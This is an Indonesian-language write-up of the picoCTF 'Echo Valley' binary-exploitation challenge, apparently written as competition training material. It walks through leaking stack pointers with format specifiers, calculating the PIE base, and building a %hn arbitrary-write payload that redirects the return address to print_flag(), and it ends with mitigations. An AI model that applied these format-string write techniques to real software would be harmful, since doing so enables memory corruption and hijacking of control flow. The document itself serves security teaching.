# Writeup: Echo Valley (Challenge ID: 485)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Binary Exploitation / Format String Arbitrary Write & PIE Bypass
- **Difficulty:** Medium (2)
- **Points:** 200
- **Author:** LT 'syreal' Jones
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{f1ckl3_f0rmat_f1asc0}`
- **Flag Platform Asli:** `picoCTF{f1ckl3_f0rmat_f1asc0}`
- **Flag Komunitas:** `CTF{f1ckl3_f0rmat_f1asc0}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Analysis), System V AMD64 ABI, CWE-134 (Use of Externally-Controlled Format String), CWE-200 (Exposure of Sensitive Information), & CWE-695 (Use of Low-Level Functionality).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Binary Exploitation & Memory Safety Assessment*:
- **Skenario Tantangan:** Peserta menganalisis biner ELF 64-bit (`valley`) yang menyimulasikan sistem gema suara (*echo*) interaktif berbasis terminal di mana pengguna dapat mengirim teks berulang kali ke lembah hingga memasukkan perintah `exit`.
- **Deskripsi Soal:** *"Sightseeing in the valley is fun, shouting is even more fun! I wonder how much fun shouting in the echo valley is! Additional details will be available after launching your challenge instance."*
- **Batasan Lingkungan & Scope Audit:**
  1. Analisis mitigasi proteksi biner x86_64: Stack Canary aktif, NX aktif, PIE aktif, Partial RELRO.
  2. Dekonstruksi kerentanan format string tak terkontrol pada fungsi `echo_valley()` yang memanggil `printf(buf)`.
  3. Pembocoran pointer runtime (*information disclosure*) untuk mengatasi proteksi ASLR dan PIE: leak frame pointer RBP dan return address fungsi `main()`.
  4. Penyusunan payload penulisan memori arbitrer (*arbitrary memory write*) menggunakan penentu format `%hn` (2-byte short write).
  5. Pengalihan alur kontrol (*control flow hijacking*) dengan menimpa alamat kembali stack frame `echo_valley` ke fungsi pemenang `print_flag()`.
  6. Verifikasi submission resmi melalui CyLab REST API `POST /api/submissions/` (HTTP 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Format String Vulnerability (CWE-134):**
   Fungsi `echo_valley()` mengalokasikan buffer stack sebesar 100 byte:
   ```c
   char buf[100];
   fgets(buf, sizeof(buf), stdin);
   printf("You heard in the distance: ");
   printf(buf);
   fflush(stdout);
   ```
   Proses meneruskan `buf` langsung sebagai parameter pertama `printf()` tanpa penentu format tetap (`printf("%s", buf)`). Penyerang dapat menyuplai specifier konversi format khusus seperti `%p` untuk membaca data register/stack, atau `%n`/`%hn` untuk menuliskan jumlah karakter yang telah dicetak ke alamat memori yang ditunjuk oleh pointer pada stack.

2. **Tata Letak Stack Frame System V AMD64 ABI:**
   Sesuai konvensi pemanggilan AMD64 ABI:
   - 6 argumen pertama diteruskan melalui register (`RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`).
   - Argumen ke-7 dan seterusnya diletakkan di stack pengguna (`RSP+0`, `RSP+8`, dst.).
   - Buffer masukan `buf` berada pada argumen ke-6 stack format string (`RSP+0`).
   - Argumen ke-20 (`%20$p`) menyimpan saved frame pointer (`RBP`) dari fungsi induk `main()`.
   - Argumen ke-21 (`%21$p`) menyimpan return address yang mengarah ke instruksi di dalam `main()` (`main+18`, offset biner `0x1413`).

3. **Kalkulasi Offset Invarian PIE & Alamat Target:**
   - Basis PIE biner: `pie_base = ret_main - 0x1413`.
   - Alamat fungsi rahasia `print_flag()`: `print_flag_addr = pie_base + 0x1269`.
   - Lokasi saved return address `echo_valley` pada stack: `ret_addr_loc = main_rbp - 8`.
   - Nilai 16-bit terbawah yang perlu ditulis: `target_val = print_flag_addr & 0xFFFF`.

4. **Arbitrary Write via Positional Specifier (`%hn`):**
   Glibc mensyaratkan bahwa bila penentu posisi bergaya POSIX (`$`) digunakan, semua specifier harus konsisten. Dengan menempatkan pointer target `ret_addr_loc` pada offset argumen ke-8 (`RSP+16`), payload `%1$<target_val>c%8$hn` mencetak sejumlah `target_val` karakter lalu menuliskan panjangnya (dalam ukuran 2 byte) ke alamat `ret_addr_loc`.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Fase Pengintaian Memori (Information Leak):**
   Kirim input format string untuk membocorkan nilai RBP dan return pointer:
   ```text
   %20$p.%21$p
   ```
   Respons layanan mengembalikan representasi heksadesimal:
   `You heard in the distance: 0x7ffd51ead620.0x58f9765d2413`.
   Dari bocoran tersebut diperoleh:
   - `main_rbp = 0x7ffd51ead620`
   - `ret_main = 0x58f9765d2413`
   - `pie_base = 0x58f9765d2413 - 0x1413 = 0x58f9765d1000`
   - `print_flag_addr = 0x58f9765d1000 + 0x1269 = 0x58f9765d2269`
   - `ret_addr_loc = 0x7ffd51ead620 - 8 = 0x7ffd51ead618`
   - `target_val = 0x2269` (8809 desimal).

2. **Penyusunan Payload Penulisan Memori (Format String Write Crafting):**
   - Format specifier: `%1$8809c%8$hn` (panjang 13 byte).
   - Padding penyelarasan: `AAA` (3 byte, total menjadi 16 byte / batas argumen 8).
   - Penempatan pointer: `p64(0x7ffd51ead618)` (8 byte little-endian).
   - Kirim payload ke socket target untuk menimpa saved RIP fungsi `echo_valley`.

3. **Pemicuan Return Frame & Pengalihan Kontrol:**
   Kirim perintah `exit\n` untuk memutus loop pemrosesan `echo_valley()`. Fungsi mengeksekusi epilog instruksi `leave; ret`. Alamat kembali yang telah dimodifikasi mengarahkan register `RIP` langsung ke fungsi `print_flag()`.

4. **Ekstraksi Token Flag:**
   Fungsi `print_flag()` membaca berkas bendera dan menampilkannya ke saluran keluaran standar:
   `academy{f1ckl3_f0rmat_f1asc0}`.

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{f1ckl3_f0rmat_f1asc0}`
- **Flag Platform Asli:** `picoCTF{f1ckl3_f0rmat_f1asc0}`
- **Flag Komunitas:** `CTF{f1ckl3_f0rmat_f1asc0}`
- **Status Submisi REST API:** HTTP 201 Created (`"correct": true`, `"historical": false`).
- **Skrip Reproduktif:** `scripts/solve_485_echo_valley.py` (eksekusi mandiri dengan pengujian invariansi kalkulasi PIE).

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Penegakan Format String Konstan:**
   Selalu sediakan string format literal konstan pada pemanggilan fungsi variadik:
   ```c
   // Celah Keamanan (Vulnerable):
   printf(buf);

   // Remediasi Aman (Secure):
   printf("%s", buf);
   ```

2. **Kompilasi dengan Opsi Pengerasan Fortify Source:**
   Aktifkan opsi proteksi `-D_FORTIFY_SOURCE=2` atau `-D_FORTIFY_SOURCE=3` bersama `-Wformat -Wformat-security -Werror=format-security` pada GCC/Clang. Proteksi runtime glibc secara otomatis memblokir penggunaan penentu format `%n` pada buffer dinamis di memori yang dapat ditulis.

3. **Full RELRO Protection (Read-Only Relocations):**
   Terapkan proteksi linker `-Wl,-z,relro,-z,now` untuk memastikan seluruh tabel segmen Global Offset Table (GOT) bersifat *read-only* setelah proses pemuatan awal, mencegah teknik penulisan arbitrer format string menimpa entri GOT.
